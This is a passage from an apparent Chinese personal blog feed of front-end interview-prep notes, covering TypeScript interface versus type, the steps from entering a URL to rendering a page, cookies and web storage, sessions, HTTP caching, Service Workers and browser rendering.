class="code"><pre><span class="line"><span class="keyword">interface</span> X &#123;  </span><br><span class="line">    <span class="attr">a</span>: <span class="built_in">number</span>  </span><br><span class="line">    <span class="attr">b</span>: <span class="built_in">string</span>  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">type</span> X = &#123;  </span><br><span class="line">    <span class="attr">a</span>: <span class="built_in">number</span>  </span><br><span class="line">    <span class="attr">b</span>: <span class="built_in">string</span>  </span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure><p>相同点： </p><ul><li>都可以描述 ‘对象’ 或者 ‘函数’ </li><li>都允许拓展(extends)</li></ul><p>不同点： </p><ul><li>type 可以为任何类型引入名称；interface 总是引入指定的对象类型。</li><li>type 可以使用 typeof 获取实例的类型进行赋值</li><li>对象类型字面量的类型别名不能有多个合并声明；一个接口可以有多个合并声明。</li></ul><p>使用 interface 描述‘数据结构’，使用 type 描述‘类型关系’</p><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p>上文提及的所有链接（太多了，就不放最后了）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本文是我在复习JavaScript，准备实习面试时整理的笔记，部分面试题参考自周游学长的博客：&lt;a href=&quot;https://github</summary>
      
    
    
    
    <category term="面试准备" scheme="https://asura1211.github.io/categories/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87/"/>
    
    
    <category term="JavaScript" scheme="https://asura1211.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>【面试准备】— — 浏览器工作原理篇</title>
    <link href="https://asura1211.github.io/2021/06/30/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E7%AF%87/"/>
    <id>https://asura1211.github.io/2021/06/30/%E3%80%90%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E3%80%91%E2%80%94%20%E2%80%94%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E7%AF%87/</id>
    <published>2021-06-30T20:55:18.000Z</published>
    <updated>2021-12-07T04:44:39.936Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文是我在复习浏览器相关知识，准备实习面试时整理的笔记，参考自一些已经整理好的博客：<a href="https://juejin.cn/post/6854573215830933512">「查缺补漏」送你18道浏览器面试题</a>，侵权删。</p><h1 id="从输入URL到界面展示发生了什么（高频）"><a href="#从输入URL到界面展示发生了什么（高频）" class="headerlink" title="从输入URL到界面展示发生了什么（高频）"></a>从输入URL到界面展示发生了什么（高频）</h1><ol><li><p><strong>构建请求</strong>：首先对 URL 进行解析，分析所需要使用的<strong>传输协议</strong>和请求资源的<strong>路径</strong>。</p><ul><li>如果输入 URL 中的协议或者主机名不合法，会把地址栏中输入的内容传递给搜索引擎。</li><li>如果没有问题，浏览器会检查 URL 中是否出现非法字符，如果存在则对其进行转义。</li></ul></li><li><p><strong>查找缓存</strong>：在真正发起网络请求之前，浏览器会先在浏览器缓存中查询是否有要请求的文件。先检查强缓存，如果命中的话直接使用，否则向服务器发起新的请求。</p></li><li><p><strong>DNS 解析</strong>：获取输入 URL 的域名 IP 地址。</p><ul><li>首先查看是否有对应的域名<strong>缓存</strong>，有的话直接用缓存的 IP 访问。</li><li>如果缓存中没有，则去查找 <strong>hosts</strong> 文件。</li><li>如果 hosts 文件里没找到域名，则将域名发往<strong>本地 DNS 服务器</strong>。</li><li>如果本地 DNS 服务器有相应域名的记录则返回。</li><li>如果没有就先向<strong>根域名服务器</strong>发起请求，它会根据请求的域名，返回对应的顶级域名服务器。</li><li>再向<strong>顶级域名服务器</strong>请求，它会返回权威域名服务器的地址。</li><li>再向<strong>权威域名服务器</strong>请求，它会返回域名的 IP 地址。</li><li>最后，本地 DNS 服务器将 IP 地址返回给客户端。</li></ul><p>客户端向本地 DNS 服务器发起请求属于<strong>递归请求</strong>，本地 DNS 服务器向各级域名服务器发起请求属于<strong>迭代请求。</strong></p></li><li><p><strong>获取目的主机 MAC 地址</strong>：</p><ul><li>应用层下发数据给<strong>传输层</strong>，TCP 协议会指定<strong>源端口号</strong>和<strong>目的端口号</strong>。</li><li>然后下发给<strong>网络层</strong>，会将本机地址作为<strong>源地址</strong>，获取的 IP 地址作为<strong>目的地址</strong>。</li><li>然后下发给<strong>数据链路层</strong>，数据链路层的发送需要加入通信双方的 MAC 地址，本机的 MAC 地址为<strong>源 MAC 地址</strong>，<strong>目的 MAC 地址</strong>需要分情况处理。通过将 IP 地址与我们本机的子网掩码相与，可以判断本机是否与请求主机在同一个子网里：<ul><li>在同一个子网里，就可以使用 APR 协议获取目的主机的 MAC 地址；</li><li>不在一个子网里，请求就应该转发给网关，由它代为转发，同样可以通过 ARP 协议获取网关的 MAC 地址。该地址即为目的主机的 MAC 地址。</li></ul></li></ul></li><li><p><strong>建立 TCP 连接</strong>：通过<strong>三次握手</strong>建立客户端和服务器之间的连接：</p><ul><li>首先客户端向服务器发送一个 SYN 连接请求报文段和一个随机序号。</li><li>服务端接收到请求后向服务器端发送一个 SYN ACK 报文段，确认连接请求，并且也向客户端发送一个随机序号。 </li><li>客户端接收服务器的确认应答后进入连接建立的状态，同时向服务器也发送一个 ACK 确认报文段。</li><li>服务器端接收到确认后，也进入连接建立状态。此时双方的连接建立。</li></ul><p>（ 如果使用的是 HTTPS 协议，在通信前还存在 TLS 的一个四次握手的过程。首先由客户端向服务器端发送使用的协议的版本号、一个随机数和可以使用的加密方法。服务器端收到后，确认加密的方法，也向客户端发送一个随机数和自己的数字证书。客户端收到后，首先检查数字证书是否有效，如果有效，则再生成一个随机数，并使用证书中的公钥对随机数加密，然后发送给服务器端，并且还会提供一个前面所有内容的 hash 值供服务器端检验。服务器端接收后，使用自己的私钥对数据解密，同时向客户端发送一个前面所有内容的 hash 值供客户端检验。这个时候双方都有了三个随机数，按照之前所约定的加密方法，使用这三个随机数生成一把秘钥，以后双方通信前，就使用这个秘钥对数据进行加密后再传输。）</p></li><li><p><strong>发送 HTTP 请求：</strong>TCP 连接完成后，开始与服务器通信。发送请求需要携带请求行，请求头和请求体。</p></li><li><p><strong>网络响应</strong>：当页面请求发送到服务器端后，会返回一个 html 文件作为响应，响应具有响应行、响应头和响应体。浏览器接收到响应后，对 html 文件进行解析，开始页面的渲染过程。</p></li><li><p><strong>渲染阶段</strong>：</p><ul><li>首先浏览器会根据 html 文件构建 DOM 树。</li><li>根据解析到的 css 文件构建 CSSOM 树。</li><li>如果遇到 script 标签，则判断是否含有 defer 或者 async 属性，否则 script 的加载和执行会造成页面渲染的阻塞。</li><li>当 DOM 树和 CSSOM 树建立好后，根据它们来构建渲染树。</li><li>渲染树构建好后，根据渲染树来进行布局，计算每个节点的位置。</li><li>布局完成后，调用 GPU 绘制，合成图层，显示在屏幕上。这时整个页面就能看见了。</li></ul></li><li><p><strong>断开 TCP 连接：</strong>四次挥手。（具体见计网篇四次挥手）</p></li></ol><h2 id="哪些阶段可以优化提升效率？"><a href="#哪些阶段可以优化提升效率？" class="headerlink" title="哪些阶段可以优化提升效率？"></a>哪些阶段可以优化提升效率？</h2><ol><li><p><strong>增加安全性</strong>：用 https 代替 http</p></li><li><p><strong>减少请求次数</strong>：利用缓存，对静态资源实现强缓存和协商缓存</p></li><li><p>DNS 优化：尽量减少 DNS 请求；分服务器部署，增加 HTTP 并发性</p></li><li><p>TCP 优化：开启长连接</p></li><li><p>数据传输：</p><ul><li><p>减少传输体积</p><ul><li>内容压缩</li><li>服务端开启 GZIP 压缩(一般压缩 60%)</li><li>数据量大则分批次请求</li></ul></li><li><p>减少 HTTP 请求次数</p><ul><li>资源文件合并处理</li><li>使用字体图标来代替图片</li><li>雪碧图 CSS-Sprit</li><li>图片 base64</li></ul></li></ul></li><li><p><strong>减少单次请求所花费的时间</strong>：CDN。CDN 的核心点有两个，一个是缓存，一个是回源。“缓存”指把资源 copy 一份到 CDN 服务器，“回源”指 CDN 发现自己没有这个资源（一般是缓存的数据过期），转头向根服务器（或者它的上层服务器）去要这个资源的过程。</p></li><li><p>渲染阶段下载文件时，使用HTTP 2.0，极大提高多图的下载效率</p></li><li><p>减少白屏时间</p><ul><li>loading</li><li>骨架屏</li><li>图片懒加载</li></ul></li><li><p>js 如果没有操作 DOM，可以用 sync 或者 defer</p></li><li><p>减少 DOM 回流</p></li></ol><h2 id="过程中哪些是GPU、哪些CPU做的（todo）"><a href="#过程中哪些是GPU、哪些CPU做的（todo）" class="headerlink" title="*过程中哪些是GPU、哪些CPU做的（todo）"></a>*过程中哪些是GPU、哪些CPU做的（todo）</h2><ul><li>GPU进程：也只有一个，用于3D/动画绘制等等</li></ul><h1 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h1><h2 id="cookie，localStorage，sessionStorage区别？（高频）"><a href="#cookie，localStorage，sessionStorage区别？（高频）" class="headerlink" title="cookie，localStorage，sessionStorage区别？（高频）"></a>cookie，localStorage，sessionStorage区别？（高频）</h2><p>![_Y_G2YI_S______R~NTP`F5.png](<a href="https://i.loli.net/2021/09/11/N49TzFGH8Y6CRvx.png">https://i.loli.net/2021/09/11/N49TzFGH8Y6CRvx.png</a>)</p><p><strong>sessionStorage：</strong>为每一个给定的源维持一个独立的存储区域。</p><p><code>cookie</code> 不建议用于存储，如果没有大量数据存储需求的话，可以使用 <code>localStorage</code> 和 <code>sessionStorage</code> 。对于不怎么改变的数据尽量使用 <code>localStorage</code> 存储，否则可以用 <code>sessionStorage</code> 存储。</p><h3 id="localStorage-和-sessionStorage-区别？"><a href="#localStorage-和-sessionStorage-区别？" class="headerlink" title="localStorage 和 sessionStorage 区别？"></a>localStorage 和 sessionStorage 区别？</h3><p><strong>相同点</strong></p><ul><li>都与 HTTP 无关，是 HTML5 提供的标准，当发起 HTTP 请求时不会与 Cookie 一样自动携带。</li><li>都是以键值对的形式存在，即 Key-Value 形式。</li><li>存储类型都是 String 类型，当进行存储时，会调用 toString() 方法转为 String 类型。</li><li>对于每个域容量是有限的，不同浏览器不一样，大部分存储为 5M 左右。</li></ul><p><strong>不同点</strong></p><ul><li>localStorage 用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。</li><li>SessionStorage 会在用户关闭浏览器后，即会话结束后，数据失效；SessionStorage 与服务端 Session 无关。</li></ul><p>使用：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">localStorage</span>.setItem(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;value&#x27;</span>);</span><br><span class="line"><span class="built_in">localStorage</span>.getItem(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line"><span class="built_in">localStorage</span>.removeItem(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line"><span class="built_in">localStorage</span>.clear();</span><br><span class="line">sessionStorage.setItem(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;value&#x27;</span>);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 由于存储数据会调用 toString() 方法</span></span><br><span class="line"><span class="comment"> * Object 类型会存储为 [object Object] 字符串</span></span><br><span class="line"><span class="comment"> * 所以进行存储时需调用 JSON.stringify() 转化为字符串</span></span><br><span class="line"><span class="comment"> * 取出时调用 JSON.parse() 将字符串转回对象</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h3 id="cookie-和-webstorage-区别？"><a href="#cookie-和-webstorage-区别？" class="headerlink" title="cookie 和 webstorage 区别？"></a>cookie 和 webstorage 区别？</h3><p>参考自 <a href="https://zhuanlan.zhihu.com/p/141039605">彻底弄清楚session,cookie,WebStorage的区别及应用场景</a>、<a href="https://blog.fundebug.com/2019/04/08/about-browser-storage/">https://blog.fundebug.com/2019/04/08/about-browser-storage/</a></p><p>HTML5 的 WebStorage 提供了两种API：localStorage（本地存储）和 sessionStorage（会话存储）。</p><p>区别：</p><ol><li><strong>存储大小</strong>：localStorage 和 sessionStorage 的存储数据大小一般都是：5MB</li><li><strong>存储位置</strong>：cookie 在浏览器和服务器间来回传递，而 localStorage 和 sessionStorage 都保存在客户端，不与服务器进行交互通信，（减少了客户端和服务器端的交互，节省网络流量，速度也更快，更安全）</li><li><strong>数据有效期</strong>：sessionStorage 仅在当前浏览器窗口关闭前有效；localStorage 始终有效；cookie 只在设置的 cookie 过期时间（expires）之前一直有效，即使窗口或浏览器关闭。</li><li><strong>存储内容类型</strong>：localStorage 和 sessionStorage 只能存储字符串类型，对于复杂的对象可以使用 JSON 对象的 stringify 和 parse 来处理。</li><li><strong>作用域</strong>：sessionStorage 即便是相同域名下的两个页面，只要不在同一个浏览器窗口中打开，就无法共享；localStorage 在所有同源窗口中都是共享的；cookie 也是在所有同源窗口中都是共享的。</li><li>获取方式：localStorage：<code>window.localStorage</code>；sessionStorage：<code>window.sessionStorage</code>；cookie：<code>document.cookie</code></li><li>应用场景：localStoragese 常用于长期登录（+判断用户是否已登录），适合长期保存在本地的数据（令牌）。sessionStorage用于敏感账号一次性登录；</li></ol><h2 id="什么是-Cookie-？（高频）"><a href="#什么是-Cookie-？（高频）" class="headerlink" title="什么是 Cookie ？（高频）"></a>什么是 Cookie ？（高频）</h2><p>深入了解：<a href="https://segmentfault.com/a/1190000017332168">一文带你看懂cookie</a></p><p>cookie 是服务器提供的<strong>用于维护会话状态信息的数据（文本形式）</strong>，通过服务器发送到浏览器，浏览器保存在本地。当下一次有同源的请求时，浏览器会自动将 cookie 添加到请求头部，发送给服务端。cookie 可以存储 <strong>4k 大小</strong>的数据，并且只能够被同源的网页所共享访问，<strong>默认有效期 20min 左右</strong>。</p><p>Cookie 主要用于以下三个方面：</p><ul><li><strong>会话状态管理</strong>（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li><li><strong>个性化设置</strong>（如用户自定义设置、主题等）</li><li><strong>浏览器行为跟踪</strong>（如跟踪分析用户行为等）</li></ul><p>服务器端可以使用 Set-Cookie 的响应头部来配置 cookie 信息。cookie 的属性值：</p><ul><li>value：如果用于保存用户登录态，应该将该值加密，不能使用明文的用户标识</li><li>secure：规定 cookie 只能在协议为 HTTPS 的请求中携带</li><li>HttpOnly：规定这个 cookie 只能被服务器访问，不能通过 JS 访问 Cookie。<strong>减少 XSS 攻击</strong></li><li>SameSite：规定浏览器不能在跨域请求中携带 Cookie，<strong>减少 CSRF 攻击</strong></li><li><strong>expires：指定 cookie 失效的时间</strong></li><li>domain：域名</li><li>path：路径，domain 和 path 一起限制了 cookie 能够被哪些 url 访问</li><li>name：名字</li><li>Priority：是 chrome 的提案，定义了三种优先级，当 cookie 数量超出时低优先级的 cookie 会被优先清除。</li></ul><p>在发生 xhr 的跨域请求的时候，即使是同源下的 cookie，也不会被自动添加到请求头部，除非显示地规定。</p><h3 id="什么是-Cookie-隔离？"><a href="#什么是-Cookie-隔离？" class="headerlink" title="*什么是 Cookie 隔离？"></a>*什么是 Cookie 隔离？</h3><p><strong>网站向服务器请求的时候，会自动带上 cookie 这样增加表头信息量，使请求变慢。</strong></p><p>如果静态文件都放在主域名下，那静态文件请求的时候会把带有 cookie 的数据提交给 server，非常浪费流量，所以不如隔离开，静态资源放 CDN。</p><p>因为 cookie 有域的限制，因此不能跨域提交请求，故使用非主要域名时，请求头中就不会带有 cookie 数据，这样可以降低请求头的大小和请求时间，从而达到降低整体请求延时的目的。</p><p>同时这种方式不会将 cookie 传入 WebServer，减少了 WebServer 对 cookie 的处理分析环节，提高了 WebServer 对 http 请求的解析速度。</p><h2 id="什么是-Session？"><a href="#什么是-Session？" class="headerlink" title="什么是 Session？"></a>什么是 Session？</h2><p>Session 代表着<strong>服务器和客户端一次会话的过程</strong>。Session 存储<strong>特定用户会话所需的属性及配置信息</strong>。这样当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量不会丢失，而是在整个用户会话中一直存在。当客户端关闭会话，或者 Session 超时失效时会话结束。</p><p>当服务器收到请求需要创建 Session 对象时，首先会检查客户端请求中是否包含 sessionid。如果有 sessionid，服务器将根据该 id 返回对应 Session 对象。如果没有，服务器会创建新的 Session 对象，并把 sessionid 在本次响应中返回给客户端。通常使用 cookie 方式存储 sessionid 到客户端。</p><h3 id="Cookie-和-Session-有什么区别？（高频）"><a href="#Cookie-和-Session-有什么区别？（高频）" class="headerlink" title="Cookie 和 Session 有什么区别？（高频）"></a>Cookie 和 Session 有什么区别？（高频）</h3><p>深入了解：<a href="https://www.cnblogs.com/ityouknow/p/10856177.html">https://www.cnblogs.com/ityouknow/p/10856177.html</a> 、 <a href="https://juejin.cn/post/6844904115080790023#heading-11">https://juejin.cn/post/6844904115080790023#heading-11</a></p><ul><li><strong>存储位置</strong>：Cookie 保存在客户端（浏览器），Session 保存在服务器端。</li><li><strong>存储大小</strong>： 单个 Cookie 保存的数据不能超过 4K，Session 可存储数据远高于 Cookie。</li><li><strong>存储内容</strong>：Cookie 只能保存<strong>字符串</strong>类型，以文本的方式；Session 通过与 Hashtable 类似的数据结构来保存，能支持任何类型的<strong>对象</strong>。一般情况下可以在 Session 中保持一些常用变量信息，比如说 UserId 等。</li><li><strong>有效期</strong>：Cookie 可设置为长时间保持，比如我们经常使用的默认登录功能，Session 一般失效时间较短，客户端关闭或者 Session 超时都会失效。</li><li><strong>安全性</strong>：Cookie 存储在客户端，比较容易遭到不法获取（Cookie欺骗，Cookie截获）；Session 存储在服务端，安全性相对 Cookie 要好一些。</li></ul><p><strong>Cookie 缺点：</strong></p><p>（1）大小受限</p><p>（2）用户可以操作（禁用）cookie，使功能受限</p><p>（3）安全性较低</p><p>（4）有些状态不可能保存在客户端。</p><p>（5）每次访问都要传送cookie给服务器，浪费带宽。</p><p>（6）cookie数据有路径（path）的概念，可以限制cookie只属于某个路径下。</p><p><strong>Session 缺点：</strong></p><p>（1）Session 保存的东西越多，就越占用服务器内存，对于用户在线人数较多的网站，服务器的内存压力会比较大。</p><p>（2）依赖于 Cookie。如果禁用 cookie，则要使用URL重写，不安全。</p><p>（3）创建 Session 变量有很大的随意性，可随时调用，不需要开发者做精确地处理，所以过度使用 Session 变量将导致代码不可读且不好维护。</p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p><strong>Cookie：</strong></p><p>（1）判断用户是否登陆过网站，以便下次登录时能够实现自动登录（或者记住密码）。如果删除 Cookie，则每次登录必须重新填写登录的相关信息。</p><p>（2）保存上次登录的时间等信息。</p><p>（3）保存上次查看的页面</p><p>（4）浏览计数</p><p><strong>Session：</strong>用于保存每个用户的专用信息，变量的值保存在服务器端，通过 SessionID 来区分不同的客户。</p><p>（1）网上商城中的购物车</p><p>（2）保存用户登录信息</p><p>（3）将某些数据放入 Session 中，供同一用户的不同页面使用</p><p>（4）防止用户非法登录</p><h3 id="怎么用-session-区别用户（todo）"><a href="#怎么用-session-区别用户（todo）" class="headerlink" title="*怎么用 session 区别用户（todo）"></a>*怎么用 session 区别用户（todo）</h3><h1 id="浏览器缓存机制"><a href="#浏览器缓存机制" class="headerlink" title="浏览器缓存机制"></a>浏览器缓存机制</h1><p>浏览器的缓存机制：在一段时间内保留已接收到的 web 资源的一个副本，如果在资源的有效时间内发起对这个资源的再一次请求，那么浏览器会直接使用缓存的副本，不向服务器发起请求。</p><p>对于一个数据请求来说，可以分为发起网络请求、后端处理、浏览器响应三个步骤。浏览器缓存可以帮助我们在第一和第三步骤中优化性能。本问题参考自 <a href="https://juejin.cn/book/6844733763675488269/section/6844733763771990029">前端面试之道</a>。</p><p><a href="https://juejin.cn/post/6844903781084184584">https://juejin.cn/post/6844903781084184584</a></p><h2 id="缓存策略（高频）"><a href="#缓存策略（高频）" class="headerlink" title="缓存策略（高频）"></a>缓存策略（高频）</h2><p>通常浏览器缓存策略分为两种：<strong>强缓存</strong>和<strong>协商缓存</strong>，并且缓存策略都是通过设置 HTTP Header 来实现的。</p><p><a href="https://segmentfault.com/a/1190000018342655">彻底理解浏览器的缓存机制（http缓存机制）</a></p><h3 id="强缓存（cache-control-高频）"><a href="#强缓存（cache-control-高频）" class="headerlink" title="强缓存（cache-control 高频）"></a>强缓存（cache-control 高频）</h3><p>强缓存：给浏览器缓存设置过期时间，超过这个时间之后缓存就过期，需要重新请求。可以通过设置两种 HTTP Header 实现：<code>Expires</code> 和 <code>Cache-Control</code> 。state code 为 <strong>200</strong>。</p><ol><li><strong>Expires：</strong>（<code>Expires: Wed, 22 Oct 2018 08:41:00 GMT</code>）Expires 是 HTTP/1 的字段，给浏览器设置了一个绝对时间，当浏览器时间超过这个绝对时间之后，重新向服务器发送请求。 Expires <strong>受限于本地时间</strong>，如果修改了本地时间，可能会造成缓存失效。（因此出现 Cache-control）</li><li><strong>Cache-control：</strong>（<code>Cache-control: max-age=30</code>）<code>Cache-Control</code> 出现于 HTTP/1.1，<strong>优先级高于 <strong><code>Expires</code> 。max-age 设置的是</strong>相对缓存时间</strong>开始往后的多少秒，因此不再受日期不准确的影响。<code>Cache-Control</code> 可以组合使用多种指令：</li></ol><p><img src="https://i.loli.net/2021/09/11/b8Dz94rL5aeByWK.png" alt="image.png"></p><p>强缓存的问题：该缓存方式优先级高，如果在过期时间内缓存的资源在服务器上更新了，客服端就不能及时获取最新的资源。</p><h3 id="协商缓存"><a href="#协商缓存" class="headerlink" title="协商缓存"></a>协商缓存</h3><p>协商缓存解决了<strong>无法及时获取更新资源</strong>的问题。</p><p>协商缓存可以通过设置两种 HTTP Header 实现：<code>Last-Modified</code> 和 <code>ETag</code> 。当浏览器发起请求验证资源时，如果资源没有改变，服务端就会返回 <strong>304</strong> 状态码，并且更新浏览器缓存有效期。</p><ol><li><p><strong>Last-Modified：</strong>表示本地文件最后修改日期，<code>If-Modified-Since</code> 会将 <code>Last-Modified</code> 的值发送给服务器，询问服务器在该日期后资源是否有更新，有更新的话就会将新的资源发送回来，否则返回 304 状态码。但是 <code>Last-Modified</code> 存在一些弊端：</p><ul><li><p>如果本地打开缓存文件，即使没有对文件进行修改，还是会造成 <code>Last-Modified</code> 被修改，服务端不能命中缓存导致发送相同的资源</p></li><li><p>因为 <code>Last-Modified</code> 只能以秒计时，如果在不可感知的时间内修改完成文件，那么服务端会认为资源还是命中了，不会返回正确的资源</p></li></ul><p>因为以上这些弊端，所以在 HTTP / 1.1 出现了 <code>ETag</code> 。</p></li><li><p><strong>ETag：</strong>类似于文件指纹，<code>If-None-Match</code> 会将当前 <code>ETag</code> 发送给服务器，询问该资源 <code>ETag</code> 是否变动，有变动的话就将新的资源发送回来。并且 <strong><code>ETag</code> 优先级比 <code>Last-Modified</code> 高</strong>。</p></li></ol><p><strong>如果什么缓存策略都没设置，那么浏览器会怎么处理？</strong></p><p>对于这种情况，浏览器会采用一个启发式的算法，通常会取响应头中的 <code>Date</code> 减去 <code>Last-Modified</code> 值的 10% 作为缓存时间。</p><h3 id="实际场景缓存策略"><a href="#实际场景缓存策略" class="headerlink" title="实际场景缓存策略"></a>实际场景缓存策略</h3><ul><li><p><strong>不需要缓存的资源</strong>：可以使用 <code>Cache-control: no-store</code> ，表示该资源不需要缓存。</p></li><li><p><strong>频繁变动的资源：</strong>首先使用 <code>Cache-Control: no-cache</code> 使浏览器每次都请求服务器，然后配合 <code>ETag</code> 或者 <code>Last-Modified</code> 来验证资源是否有效。这样的做法虽然不能节省请求数量，但是能显著减少响应数据大小。</p></li><li><p><strong>代码文件：</strong>给代码文件设置缓存有效期一年 <code>Cache-Control: max-age=31536000</code>并配合策略缓存使用，然后对文件进行指纹处理，一旦文件名变动就会立刻下载新的文件（对文件名进行哈希处理，只有当代码修改后才会生成新的文件名）。</p></li></ul><h2 id="缓存位置"><a href="#缓存位置" class="headerlink" title="*缓存位置"></a>*缓存位置</h2><p>从缓存位置上来说分为四种，并且各自有<strong>优先级</strong>，当依次查找缓存且都没有命中的时候，才会去请求网络。</p><ol><li><p>Service Worker：Service Worker 的缓存与浏览器其他内建的缓存机制不同，它可以让我们<strong>自由控制</strong>缓存哪些文件、如何匹配缓存、如何读取缓存，并且<strong>缓存是持续性的</strong>。</p><p>当 Service Worker 没有命中缓存的时候，我们需要去调用 <code>fetch</code> 函数获取数据。也就是说，如果我们没有在 Service Worker 命中缓存的话，会根据缓存查找优先级去查找数据。但是不管我们是从 Memory Cache 中还是从网络请求中获取的数据，浏览器都会显示我们是<strong>从 Service Worker 中获取的内容</strong>。</p></li><li><p>Memory Cache：即内存中的缓存，读取内存中的数据肯定比磁盘快。<strong>但是内存缓存虽然读取高效，可是缓存持续性很短，会随着进程的释放而释放。</strong> 一旦我们关闭 Tab 页面，内存中的缓存也就被释放了。</p></li><li><p>Disk Cache：即存储在硬盘中的缓存，读取速度慢点，但是什么都能存储到磁盘中，比之 Memory Cache <strong>胜在容量和存储时效性上。</strong></p><p>在所有浏览器缓存中，Disk Cache 覆盖面基本是最大的。它会根据 HTTP Herder 中的字段判断哪些资源需要缓存，哪些资源可以不请求直接使用，哪些资源已经过期需要重新请求。<strong>并且即使在跨站点的情况下，相同地址的资源一旦被硬盘缓存下来，就不会再次去请求数据。</strong></p></li><li><p>Push Cache：是 HTTP/2 中的内容，当以上三种缓存都没有命中时，它才会被使用。<strong>并且缓存时间也很短暂，只在会话（Session）中存在，一旦会话结束就被释放。</strong></p></li><li><p>网络请求：如果所有缓存都没有命中的话，那么只能发起请求来获取资源了。</p></li></ol><h2 id="移动端缓存？"><a href="#移动端缓存？" class="headerlink" title="移动端缓存？"></a>移动端缓存？</h2><p><a href="https://www.jianshu.com/p/5de13c7a8954">https://www.jianshu.com/p/5de13c7a8954</a></p><h2 id="什么是-Service-Worker？"><a href="#什么是-Service-Worker？" class="headerlink" title="*什么是 Service Worker？"></a>*什么是 Service Worker？</h2><p>Service Worker 是运行在浏览器背后的<strong>独立线程</strong>，一般可以用来实现缓存功能。使用 Service Worker的话，传输协议必须为 <strong>HTTPS</strong>。因为 Service Worker 中涉及到请求拦截，所以必须使用 HTTPS 协议来保障安全。</p><p>Service Worker 实现缓存功能一般分为三个步骤：首先需要先注册 Service Worker，然后监听到 <code>install</code> 事件以后就可以缓存需要的文件，那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存，存在缓存的话就可以直接读取缓存文件，否则就去请求数据。</p><h1 id="浏览器渲染原理"><a href="#浏览器渲染原理" class="headerlink" title="浏览器渲染原理"></a>浏览器渲染原理</h1><h2 id="渲染过程（高频）"><a href="#渲染过程（高频）" class="headerlink" title="渲染过程（高频）"></a>渲染过程（高频）</h2><p>参考自 <a href="https://juejin.cn/book/6844733763675488269/section/6844733763771957256">前端面试之道</a> 、<a href="https://juejin.cn/post/6916157109906341902/#heading-36">https://juejin.cn/post/6916157109906341902/#heading-36</a></p><p><strong>一、浏览器接收到 HTML 文件并转换为 DOM 树：</strong>（遇到img标签就加载图片）</p><ul><li><p>打开一个网页时，浏览器会去请求对应的 HTML 文件。当浏览器接收到这些字节数据以后，它会将这些<strong>字节数据转换为字符串</strong>，也就是我们写的代码。</p></li><li><p>数据转换为字符串以后，浏览器会先将这些字符串通过词法分析转换为<strong>标记</strong>（token），这一过程在词法分析中叫做<strong>标记化</strong>（tokenization）。</p></li><li><p>结束标记化后，这些标记会紧接着转换为 Node，最后这些 Node 会根据不同 Node 之前的联系构建为一颗 DOM 树。</p></li></ul><p><img src="https://i.loli.net/2021/09/11/9l5tgzC67v8XdIV.png" alt="image.png"></p><p><strong>二、将 CSS 文件转换为 CSSOM 树：</strong></p><p>这一过程 浏览器会确定每一个节点的<strong>样式</strong>（很消耗资源）。因为样式可以自行设置给某个节点，也可以通过继承获得。浏览器会<strong>递归</strong> CSSOM 树，然后确定具体的元素的样式。所以应该尽可能的避免写<strong>过于具体</strong>的 CSS 选择器（例如 <code>div &gt; a &gt; span</code>），也尽量少添加无意义标签，保证<strong>层级扁平</strong>。</p><p><strong>三、根据 DOM 树和 CSSOM 规则树生成渲染树：</strong></p><p>（当发生 <code>DOMContentLoaded</code> 事件后，就会生成渲染树）</p><p><img src="https://i.loli.net/2021/09/11/SkfPoQpEnyXaA3V.png" alt="image.png"></p><p>渲染树的节点被称为渲染对象，和 DOM 元素相对应，但不是一对一的，不可见的 DOM 元素不会被插入渲染树。</p><p><strong>四、根据渲染树来进行布局：</strong></p><p>当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流），这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。</p><p><strong>五、绘制阶段：</strong></p><p>遍历渲染树，调用 GPU 绘制，合成图层，显示在屏幕上。</p><h2 id="什么情况阻塞渲染？"><a href="#什么情况阻塞渲染？" class="headerlink" title="什么情况阻塞渲染？"></a>什么情况阻塞渲染？</h2><p><a href="https://www.cnblogs.com/chenjg/p/7126822.html">https://www.cnblogs.com/chenjg/p/7126822.html</a></p><p><strong>CSS：</strong></p><ul><li><p><code>CSS</code>不会阻塞<code>DOM</code>解析，但会阻塞<code>DOM</code>渲染。</p><p>因为 DOM 和 CSSOM 通常是并行构建的，但 Render Tree 是依赖 DOM Tree和 CSSOM Tree 的，所以它必须等到两者都加载完毕后，完成相应的构建，才开始渲染。</p></li><li><p><code>CSS</code>会阻塞 JS 执行，并不会阻塞 JS 文件下载</p><p>因为如果脚本的内容是获取元素的样式，宽高等属性，浏览器需要计算，也就是依赖于 CSS。为避免样式获取，浏览器只好等前面所有的样式下载完后，再执行 JS。JS 